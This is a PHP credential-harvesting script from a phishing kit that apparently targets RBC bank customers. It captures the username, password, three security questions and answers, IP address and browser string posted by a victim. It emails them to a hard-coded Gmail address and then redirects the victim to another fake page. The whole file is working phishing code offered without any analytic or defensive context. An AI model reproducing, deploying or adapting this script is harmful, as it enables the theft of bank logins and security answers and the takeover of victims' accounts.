<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginResults-------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "-----------------2 QuestionResults----------------\n";
$message .= "question1 : ".$_POST['question1']."\n";
$message .= "answer1 : ".$_POST['answer1']."\n";
$message .= "question2 : ".$_POST['question2']."\n";
$message .= "answer2 : ".$_POST['answer2']."\n";
$message .= "question3 : ".$_POST['question3']."\n";
$message .= "answer3 : ".$_POST['answer3']."\n";
$message .= "-----------------created by 723806851---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------rbcResults-----------------------\n";
$send = "marcusfield20@gmail.com";
$subject = "RBCResultz 1 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
?>
<script>
    window.top.location.href = "rbcgi3m012.html";

</script>